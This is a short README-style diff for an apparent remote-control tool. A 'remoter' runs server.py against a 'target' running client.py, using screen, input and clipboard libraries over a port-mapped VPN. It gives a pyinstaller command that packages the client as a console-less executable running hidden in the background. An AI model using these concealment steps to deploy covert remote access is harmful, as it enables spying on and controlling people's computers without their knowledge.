@@ -1,0 +1,15 @@
+I need to connect to openvpn config from portmap.com
+
+client need to install python tools with this command on cmd 
+
+For client user :
+pip install pyautogui pyperclip Pillow
+
+the remoter use server.py
+
+the target use client.py
+
+This command is good for client.py, it makes client.py a .exe file, runs with no console & as background process (you only can see it in task manager)
+Here's the command :
+
+pyinstaller --noconsole --onefile client.py
